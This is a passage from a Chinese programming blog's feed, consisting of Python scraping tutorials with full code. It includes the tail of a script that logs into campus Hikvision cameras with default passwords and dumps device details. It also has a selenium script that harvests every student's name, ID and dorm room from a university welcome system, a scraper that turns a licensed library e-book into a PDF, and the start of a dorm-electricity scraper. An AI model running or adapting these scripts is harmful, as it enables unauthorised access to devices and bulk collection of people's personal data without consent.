", chanel_ret</span></span><br><span class="line">            <span class="comment"># 再来解析mac地址</span></span><br><span class="line">            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">            s.connect((ip, <span class="number">8000</span>))</span><br><span class="line">            mac_req = <span class="string">"\x00\x00\x00 Z\x00\x00\x00\x00\x00\x00\x00\x00\x02\x01\x00\x0f\x02\x00\n\x00\x01\x00\x02\x08\x00';Je\x00\x00"</span></span><br><span class="line">            s.send(mac_req)</span><br><span class="line">            mac_ret = s.recv(<span class="number">1024</span>)</span><br><span class="line">            s.close()</span><br><span class="line">            t_2[ip] = &#123;<span class="string">'chanel'</span>: chanel_ret[<span class="number">20</span>:<span class="number">40</span>].strip(<span class="string">'\x00'</span>).decode(<span class="string">'gbk'</span>),</span><br><span class="line">                       <span class="string">'server_name'</span>: name_seq_ret[<span class="number">20</span>:<span class="number">40</span>].strip(<span class="string">'\x00'</span>),</span><br><span class="line">                       <span class="string">'seqnum'</span>: name_seq_ret[<span class="number">60</span>:<span class="number">100</span>].strip(<span class="string">'\x00'</span>),</span><br><span class="line">                       <span class="string">'mac'</span>: <span class="string">"%02x:%02x:%02x:%02x:%02x:%02x:"</span> % struct.unpack(<span class="string">'BBBBBB'</span>, mac_ret[<span class="number">36</span>:<span class="number">42</span>])&#125;</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        t_2[ip] = <span class="string">''</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> t_2.keys():</span><br><span class="line">    device_info(ip)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] Dumping type 2 devices info"</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./dump/camera/t_2.txt'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pickle.dump(t_2, f)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> t_2.iteritems():</span><br><span class="line">    <span class="keyword">if</span> v == <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">print</span> k, <span class="string">': login failed'</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">print</span> k, <span class="string">': Ok, info dumped.'</span></span><br></pre></td></tr></table></figure>
<p>根据同样的原理，我们还可以写爬虫搜集整个局域网互联网内其它信息，比如ftp，特别是匿名ftp，sql，代理服务器啊，等等，</p>
<p>大概是知道创宇的zoomeye出来之前，我想在贵邮局域网实现shadon，一个设备杂项搜索引擎，最后，实验室太忙了= =只有个从未公开的ftp搜索web界面</p>
<p><img src="/images/spider/net_scan_7.png" alt=""></p>
<p>第一次做效率奇低，特别在加上不同的中文编码</p>
<p><img src="/images/spider/net_scan_8.png" alt=""></p>
<p>第二次好多了，如果以后有空再说吧</p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="Hikvision视频监控系统：摄像头发现与默认密码登录(gevent)">Hikvision视频监控系统：摄像头发现与默认密码登录(gevent)</h2><blockquote>
<p>一切都在不可避免的走向庸俗</p>
<p>王小波</p>
</blockq]]>
    </summary>
    
      <category term="python" scheme="http://reverland.org/tags/python/"/>
    
      <category term="spider" scheme="http://reverland.org/tags/spider/"/>
    
      <category term="python" scheme="http://reverland.org/categories/python/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Python Spider: 迎新系统学生信息爬取]]></title>
    <link href="http://reverland.org/python/2015/04/05/yingxin/"/>
    <id>http://reverland.org/python/2015/04/05/yingxin/</id>
    <published>2015-04-04T16:00:00.000Z</published>
    <updated>2015-11-15T06:01:31.555Z</updated>
    <content type="html"><![CDATA[<h2 id="每一颗眼泪，是一万道光：迎新系统学生信息爬取">每一颗眼泪，是一万道光：迎新系统学生信息爬取</h2><blockquote>
<p>You don’t get over the fear. You run towards it, with your knees buckling.</p>
<p>—Amin Ariana, Technical Founder, hacker and advisor at several ventures</p>
</blockquote>
<p>有多少次，希望那短暂平凡的一刻又一刻定格到永恒。</p>
<p>简简单单就是幸福</p>
<p>忘乎所有只有热爱</p>
<hr>
<p>去年8月，来跪邮写得第一个程序。在学十还略显空荡的房间，空荡荡的桌面，床上没有被子只有个睡袋，惨白惨白的灯光和兴奋的新同学们。</p>
<p>这次，依然是selenium专场。让程序操作浏览器。</p>
<p>首先，依然是研究整个流程。</p>
<p>打开 <a href="http://welcome.bupt.edu.cn" target="_blank" rel="external">http://welcome.bupt.edu.cn</a></p>
<p>看看怎么登录</p>
<p><img src="/images/spider/yingxin.png" alt=""></p>
<p>一切显而易见，输入用户名密码，点击登录按钮。</p>
<p>进入界面</p>
<p><img src="/images/spider/yingxin1.png" alt=""></p>
<p>这时候看到有个选框，发现可以选择研究生或者本科生。在这里我不讨论这个问题，留作读者自己思考。</p>
<p>我们随便翻翻看看</p>
<p>注意到左下角有几个页码，左边还有个<code>3136/210</code>之类的东西。</p>
<p>大概研究下猜想，3136是学生总数，210是总页数。</p>
<p>同时注意到页码是一次显示5页，通过点击<code>&gt;</code>翻入下个5页。</p>
<p><img src="/images/spider/yingxin2.png" alt=""></p>
<p>为了得到我们要翻多少页，需要提取出210这个数。我们已经讲过如何用xpath来索引到对应的元素。</p>
<p><img src="/images/spider/yingxin3.png" alt=""></p>
<p>紧接着，抓取，点击下一页，每翻五页，点击<code>&gt;</code>，然后继续重复以上步骤。</p>
<p>直到把210页全翻完。</p>
<p>我们要提取的信息在class<code>porlet-table</code>中</p>
<p><img src="/images/spider/yingxin4.png" alt=""></p>
<p>接着，一切都显而易见了，用selenium自动化这个步骤。</p>
<p>我是直接在ipython中一点点试验这个过程，最后把历史记录摘录出来写成程序，最后在ipython中打开pdb自动捕捉异常的功能或者设置断点来运行调试。</p>
<p>当然，也许你使用自己的方式。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="comment">#from selenium.webdriver.common.keys import Keys</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">'Reverland'</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span><br><span class="line">You know what it is...</span><br><span class="line">With NO warranty.</span><br><span class="line">At your OWN risk.</span><br><span class="line"></span><br><span class="line">A quick and dirty spider implemented with selenium webdriver</span><br><span class="line">to dump the students' dorm data</span><br><span class="line"></span><br><span class="line">条码号  姓名    院系    专业    学号    班级    宿舍校区    宿舍区  宿舍楼</span><br><span class="line">宿舍房号    床号    入住情况</span><br><span class="line">"""</span></span><br><span class="line"></span><br><span class="line">driver = webdriver.Firefox()</span><br><span class="line">driver.get(<span class="string">"http://welcome.bupt.edu.cn"</span>)</span><br><span class="line">username = driver.find_element_by_id(<span class="string">"username"</span>)</span><br><span class="line">password = driver.find_element_by_id(<span class="string">"password"</span>)</span><br><span class="line">username.send_keys(<span class="string">"2xxxxxx"</span>)</span><br><span class="line">password.send_keys(<span class="string">"xxxxx"</span>)</span><br><span class="line">submit = driver.find_element_by_name(<span class="string">"submit"</span>)</span><br><span class="line">submit.click()</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># login success</span></span><br><span class="line"><span class="comment"># y</span></span><br><span class="line">p = <span class="number">1</span></span><br><span class="line">xpath_p_last = <span class="string">'//div[@class="pagination-info clearFix"]/span'</span></span><br><span class="line">n_pages = driver.find_element_by_xpath(xpath_p_last)</span><br><span class="line">p_last = int(n_pages.text.split(<span class="string">'/'</span>)[<span class="number">1</span>])</span><br><span class="line">n_student = int(n_pages.text.split(<span class="string">'/'</span>)[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Number of Students Found: "</span>, n_student</span><br><span class="line"><span class="keyword">while</span> (p &lt;= p_last):</span><br><span class="line">    time.sleep(random.randint(<span class="number">3</span>, <span class="number">5</span>))</span><br><span class="line">    table = driver.find_element_by_class_name(<span class="string">"portlet-table"</span>)</span><br><span class="line">    <span class="comment"># remove headers</span></span><br><span class="line">    text = table.text[<span class="number">45</span>::] + <span class="string">'\n'</span></span><br><span class="line">    <span class="keyword">print</span> text</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"bupt_students_yan.txt"</span>, <span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(text.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    p += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> p &gt; p_last:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"finished"</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> p % <span class="number">5</span> == <span class="number">1</span>:</span><br><span class="line">        driver.find_element_by_link_text(<span class="string">"&gt;"</span>).click()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        driver.find_element_by_link_text(str(p)).click()</span><br><span class="line"></span><br><span class="line"><span class="comment"># b</span></span><br><span class="line">option = driver.find_element_by_xpath(<span class="string">'//select/option[@value="serieN10B"]'</span>)</span><br><span class="line">option.click()</span><br><span class="line">p = <span class="number">1</span></span><br><span class="line">xpath_p_last = <span class="string">'//div[@class="pagination-info clearFix"]/span'</span></span><br><span class="line">n_pages = driver.find_element_by_xpath(xpath_p_last)</span><br><span class="line">p_last = int(n_pages.text.split(<span class="string">'/'</span>)[<span class="number">1</span>])</span><br><span class="line">n_student = int(n_pages.text.split(<span class="string">'/'</span>)[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Number of Students Found: "</span>, n_student</span><br><span class="line"><span class="keyword">while</span> (p &lt;= p_last):</span><br><span class="line">    time.sleep(random.randint(<span class="number">3</span>, <span class="number">5</span>))</span><br><span class="line">    table = driver.find_element_by_class_name(<span class="string">"portlet-table"</span>)</span><br><span class="line">    <span class="comment"># remove headers</span></span><br><span class="line">    text = table.text[<span class="number">45</span>::] + <span class="string">'\n'</span></span><br><span class="line">    <span class="keyword">print</span> text</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"bupt_students_ben.txt"</span>, <span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(text.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    p += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> p &gt; p_last:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"finished"</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> p % <span class="number">5</span> == <span class="number">1</span>:</span><br><span class="line">        driver.find_element_by_link_text(<span class="string">"&gt;"</span>).click()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        driver.find_element_by_link_text(str(p)).click()</span><br></pre></td></tr></table></figure>
<p>Happy hacking~</p>
<p><img src="/images/spider/yingxin6.png" alt=""></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="每一颗眼泪，是一万道光：迎新系统学生信息爬取">每一颗眼泪，是一万道光：迎新系统学生信息爬取</h2><blockquote>
<p>You don’t get over the fear. You run towards it, with your knees ]]>
    </summary>
    
      <category term="python" scheme="http://reverland.org/tags/python/"/>
    
      <category term="spider" scheme="http://reverland.org/tags/spider/"/>
    
      <category term="python" scheme="http://reverland.org/categories/python/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Python Spider: 超星图书爬取转换]]></title>
    <link href="http://reverland.org/python/2015/04/04/chaoxing/"/>
    <id>http://reverland.org/python/2015/04/04/chaoxing/</id>
    <published>2015-04-03T16:00:00.000Z</published>
    <updated>2015-11-15T06:01:31.555Z</updated>
    <content type="html"><![CDATA[<h2 id="超星数字图书馆(北邮镜像):_在线阅读书籍爬取转换(selenium)">超星数字图书馆(北邮镜像): 在线阅读书籍爬取转换(selenium)</h2><blockquote>
<p>我忧心忡忡地看待未来，但仍满怀美好的希望。</p>
<p>—— Albert Schweitzer</p>
</blockquote>
<p>这次推荐selenium，自从有了selenium，爬虫从来没有这么简单过。</p>
<hr>
<p>几天前，一个工作的同学想让我帮他借一本书《聚酰亚胺新型材料》，他工作上需要看这本书的一些内容，但是这本书已经绝版，网上也没有出售。</p>
<p>于是我帮他搜索了下，图书馆里没有这本书。忽然想起来我邮还买了很多电子资源。</p>
<p>于是从图书馆主页选择<code>电子图书</code>-&gt;<code>超星数字电子图书数据</code>，进入如下页面。</p>
<p><img src="/images/spider/chaoxing.png" alt=""></p>
<p>搜索了下这本书，找到了一本。</p>
<p><img src="/images/spider/chaoxing1.png" alt=""></p>
<p>太棒了，下载下来……额……下载需要阅读器……</p>
<p><img src="/images/spider/chaoxing2.png" alt=""></p>
<p>对一个伪geek最讨厌的事情之一就是，某个牛比的企业倚杖其资源绑架用户安装所谓的客户端。比如讨厌的腾讯和讨厌的淘宝。</p>
<p>自然也不会下载什么阅读器，但是，既然可以在线看，那么就可以下载下来。实在在不行我浏览器截图行么。</p>
<p>selenium让一切成为可能(包括截图)。</p>
<p>让我们在线阅读：</p>
<p><img src="/images/spider/chaoxing3.png" alt=""></p>
<p>在线阅读提供了一些功能，包括索引、目录和文字提取，悲剧的是下载下来之后转成的pdf可没有这么多道道。虽然，如果肯花时间解决这些都不是问题……但是，我们又不是想pirate电子书……</p>
<p>对页面按右键发现这是个图片！接着观察对应的源码发现，是一个input标签，仔细观察这个input标签你可以看到很多属性，比如比较重要的class、scr、src、jpgname。</p>
<p>仔细多观察一个，你会发现，class是Jimg的似乎都是书页内容、jpgname属性是页码、scr和src好像都是书页图片地址。</p>
<p><img src="/images/spider/chaoxing4.png" alt=""></p>
<p>你可以试试。说服自己那些就是书页图片地址</p>
<p><img src="/images/spider/chaoxing6.png" alt=""></p>
<p>多看几个发现下面的页面其实src属性都是假的，猜测是书页滚动到某个页面，通过js动态修改src来实现实时加载而不是一下全加载。</p>
<p><img src="/images/spider/chaoxing5.png" alt=""></p>
<p>那么，我们抓取当前网页阅读页面所有class属性是<code>Jimg</code>的input标签的<code>scr</code>标签，就可以获取所有书页的图像了。</p>
<p>接下来，看看selenium是多么丧心病狂……</p>
<p>我们把以上所有从搜索到在线阅读的过程自动化……</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> imghdr</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line"><span class="comment"># bookname = u'聚酰亚胺新型材料'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    bookname = unicode(sys.argv[<span class="number">1</span>], <span class="string">'utf-8'</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[Usage:] chaoxing.py bookname"</span></span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line">driver = webdriver.Firefox()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先搜索</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://sslibbook2.sslibrary.com'</span></span><br><span class="line"></span><br><span class="line">driver.get(url)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入书名</span></span><br><span class="line">driver.find_element_by_id(<span class="string">'sword'</span>).send_keys(bookname)</span><br><span class="line"><span class="comment"># 检索</span></span><br><span class="line">driver.find_element_by_class_name(<span class="string">"btn-jiansuo"</span>).click()</span><br><span class="line"><span class="comment"># 检索结果</span></span><br><span class="line">driver.switch_to_frame(<span class="string">'book'</span>)</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(len(driver.find_elements_by_class_name(<span class="string">'yy'</span>)) &gt; <span class="number">1</span>)</span><br><span class="line"><span class="comment"># 确认书名</span></span><br><span class="line"><span class="keyword">assert</span>(driver.find_elements_by_class_name(<span class="string">'yy'</span>)[<span class="number">0</span>].text</span><br><span class="line">       == <span class="string">u"《"</span> + bookname + <span class="string">u"》"</span>)</span><br><span class="line"><span class="comment"># 确认有网页阅读</span></span><br><span class="line"><span class="keyword">assert</span>(driver.find_elements_by_class_name(<span class="string">'yy'</span>)[<span class="number">1</span>].text == <span class="string">u'网页阅读'</span>)</span><br><span class="line"></span><br><span class="line">bookurl = driver.find_elements_by_class_name(<span class="string">'yy'</span>)[<span class="number">1</span>].get_attribute(<span class="string">'href'</span>)</span><br><span class="line"></span><br><span class="line">driver.get(bookurl)</span><br><span class="line"></span><br><span class="line"><span class="comment"># where img locate</span></span><br><span class="line">base_url = <span class="string">"http://"</span> + urllib2.urlparse.urlparse(driver.current_url).netloc</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(driver.page_source.find(<span class="string">u'超星'</span>) &gt;= <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">pages = driver.find_elements_by_xpath(<span class="string">'//input[@class="Jimg"]'</span>)</span><br><span class="line"></span><br><span class="line">filelist = [e.get_attribute(<span class="string">'jpgname'</span>) <span class="keyword">for</span> e <span class="keyword">in</span> pages]</span><br><span class="line"></span><br><span class="line">imglist = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> pages:</span><br><span class="line">    imglist[e.get_attribute(<span class="string">'jpgname'</span>)] = base_url + e.get_attribute(<span class="string">'scr'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> imglist.iteritems():</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(k):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        urllib.urlretrieve(v, k)</span><br><span class="line">        <span class="keyword">assert</span>(imghdr.what(k) == <span class="string">'png'</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">print</span> e</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">u'convert '</span> + <span class="string">u' '</span>.join(filelist) + <span class="string">' '</span> + bookname + <span class="string">u'.pdf'</span></span><br><span class="line">cmd = cmd.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">os.popen(cmd)</span><br></pre></td></tr></table></figure>
<p>稍微解释下，最后，是用imagemagick把一大堆png格式的书页内容转化成pdf格式。这个过程相当耗内存……如果有空就想想怎么换种方式转pdf，也愿各位看官能指教下。</p>
<p><img src="/images/spider/chaoxing7.png" alt=""></p>
<p>当然，我并没有把pdf传给任何人，我看完之后跟同学讲了讲，没有做任何盗版行径。同学们也要遵守用户守则，不要乱搞。</p>
<p>让我们引以为戒 <a href="http://zh.wikipedia.org/wiki/%E4%BA%9A%E4%BC%A6%C2%B7%E6%96%AF%E6%B2%83%E8%8C%A8" target="_blank" rel="external">Aaron Swartz</a></p>
<p><img src="img=http://upload.wikimedia.org/wikipedia/commons/thumb/0/06/Aaron_Swartz_profile.jpg/220px-Aaron_Swartz_profile.jpg" alt="Aaron Swartz"></p>
<p>非法下载书籍的罪名是非常非常严重的！！！！！</p>
<hr>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="超星数字图书馆(北邮镜像):_在线阅读书籍爬取转换(selenium)">超星数字图书馆(北邮镜像): 在线阅读书籍爬取转换(selenium)</h2><blockquote>
<p>我忧心忡忡地看待未来，但仍满怀美好的希望。</p>
<p>—— Albert ]]>
    </summary>
    
      <category term="python" scheme="http://reverland.org/tags/python/"/>
    
      <category term="spider" scheme="http://reverland.org/tags/spider/"/>
    
      <category term="python" scheme="http://reverland.org/categories/python/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Python Spider: 北邮用电查询系统数据]]></title>
    <link href="http://reverland.org/python/2015/04/03/ydcx/"/>
    <id>http://reverland.org/python/2015/04/03/ydcx/</id>
    <published>2015-04-02T16:00:00.000Z</published>
    <updated>2015-11-15T06:01:31.555Z</updated>
    <content type="html"><![CDATA[<h2 id="愿总有阳光照进回忆里：学生购电用电查询系统">愿总有阳光照进回忆里：学生购电用电查询系统</h2><p>感冒了，难得会被人挂念。谢谢，总有阳光照进回忆里，温暖的气息让人难以忘记。</p>
<hr>
<p>某天，一位大神师兄 @Zhaoking 神秘兮兮地给我看一个网站 <a href="http://ydcx.bupt.edu.cn/" target="_blank" rel="external">http://ydcx.bupt.edu.cn/</a></p>
<p>师兄说，你可以试着把它的数据爬下来。</p>
<p>当时开着八个线程跟着机器学习、回归分析、统计推断、探索性图形分析一堆数据分析的课程，觉得似乎把用电数据爬下来可以玩玩。<br>于是谨听师兄命令……</p>
<p><img src="/images/spider/ydcx.png" alt=""></p>
<p>首先，就是研究研究网站逻辑。打开firebug，输入1-101，回车。</p>
<p><img src="/images/spider/ydcx1.png" alt=""></p>
<p>显然，首先是一个post操作，但返回了一个302重定向，所以，第二个请求应该是正确的请求</p>
<p>试试看看</p>
<pre><code><span class="keyword">In</span> [<span class="number">1</span>]: import requests

<span class="keyword">In</span> [<span class="number">2</span>]: dorm_num = <span class="comment">'1-101'</span>

<span class="keyword">In</span> [<span class="number">3</span>]: r = requests.<span class="keyword">get</span>(<span class="comment">'http://ydcx.bupt.edu.cn/see.aspx?useid=' + dorm_num)</span>
</code></pre><p>检查下r.content，确认在里头看到了电量和加电信息。</p>
<p><img src="/images/spider/ydcx2.png" alt=""></p>
<p>那么，还有这么多页这么办？我们点点看看。页码1已经不能点了，点2。</p>
<p><img src="/images/spider/ydcx3.png" alt=""></p>
<p>竟然变成一个post了，而且post的数据这么多，你可以抱着试试看的心理不加上这些post的数据试试。</p>
<pre><code><span class="keyword">In</span> [<span class="number">5</span>]: __EVENTTARGET = <span class="string">'GridView1'</span>

<span class="keyword">In</span> [<span class="number">6</span>]: __EVENTARGUMENT = <span class="string">'Page$2'</span>

<span class="keyword">In</span> [<span class="number">7</span>]: <span class="keyword">data</span> = {<span class="string">'__EVENTTARGET'</span>: __EVENTTARGET,  <span class="string">'__EVENTARGUMENT'</span>: __EVENTARGUMENT}

<span class="keyword">In</span> [<span class="number">9</span>]: r = requests.post(<span class="string">'http://ydcx.bupt.edu.cn/see.aspx?useid='</span> + dorm_num, <span class="keyword">data</span>=<span class="keyword">data</span>)

<span class="keyword">In</span> [<span class="number">10</span>]: r
Out[<span class="number">10</span>]: &lt;Response [<span class="number">500</span>]&gt;
</code></pre><p>500——internal error……这个错误一般表示服务器内部处理出现错误。怎么回事呢，直觉告诉我们，问题就在于那些Post的参数。</p>
<p>加上试试，</p>
<pre><code> <span class="keyword">In</span> [<span class="number">15</span>]: <span class="keyword">data</span> = {<span class="string">'__EVENTTARGET'</span>: __EVENTTARGET,  <span class="string">'__EVENTARGUMENT'</span>: __EVENTARGUMENT, <span class="string">'__EVENTVALIDATION'</span>: <span class="string">'/wEWCwLMxp63CAKtsp64BAKtsuK4BAKtsva4BAKtsvq4BAKtsu64BAKtsvK4BAKtssa4BAKtssq4BALDuK6IBQKokYx1/Loh35D537/CRr+++EgM74nLP5E='</span>, <span class="string">'__VIEWSTATE'</span>: <span class="string">'/wEPDwULLTIwNzMwNzAxOTAPZBYCAgMPZBYQZg8PFgIeBFRleHQFATFkZAIBDw8WAh8ABQEgZGQCAg8PFgIfAAUyMS0xMDEgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZAIDDw8WAh8ABQbnlLXku7dkZAIEDw8WAh8ABQwwMDAwMDAwMzg5NTVkZAIFDw8WAh8ABQ0xMC4yMTAuOTYuMjEwZGQCBg88KwANAQAPFgQeC18hRGF0YUJvdW5kZx4LXyFJdGVtQ291bnQCjQNkFgJmD2QWFgIBD2QWBmYPDxYCHwAFMjEtMTAxICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGQCAQ8PFgIfAAURMjAxNC04LTI0IDA6MDA6MDBkZAICDw8WAh8ABQMyMTVkZAICD2QWBmYPDxYCHwAFMjEtMTAxICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGQCAQ8PFgIfAAURMjAxNC04LTIzIDA6MDA6MDBkZAICDw8WAh8ABQMyMThkZAIDD2QWBmYPDxYCHwAFMjEtMTAxICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGQCAQ8PFgIfAAURMjAxNC04LTIyIDA6MDA6MDBkZAICDw8WAh8ABQMyMjBkZAIED2QWBmYPDxYCHwAFMjEtMTAxICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGQCAQ8PFgIfAAURMjAxNC04LTIxIDA6MDA6MDBkZAICDw8WAh8ABQMyMjNkZAIFD2QWBmYPDxYCHwAFMjEtMTAxICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGQCAQ8PFgIfAAURMjAxNC04LTIwIDA6MDA6MDBkZAICDw8WAh8ABQMyMjVkZAIGD2QWBmYPDxYCHwAFMjEtMTAxICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGQCAQ8PFgIfAAURMjAxNC04LTE5IDA6MDA6MDBkZAICDw8WAh8ABQMyMjhkZAIHD2QWBmYPDxYCHwAFMjEtMTAxICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGQCAQ8PFgIfAAURMjAxNC04LTE4IDA6MDA6MDBkZAICDw8WAh8ABQMyMzBkZAIID2QWBmYPDxYCHwAFMjEtMTAxICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGQCAQ8PFgIfAAURMjAxNC04LTE3IDA6MDA6MDBkZAICDw8WAh8ABQMyMzJkZAIJD2QWBmYPDxYCHwAFMjEtMTAxICAgICAgICAgICAgI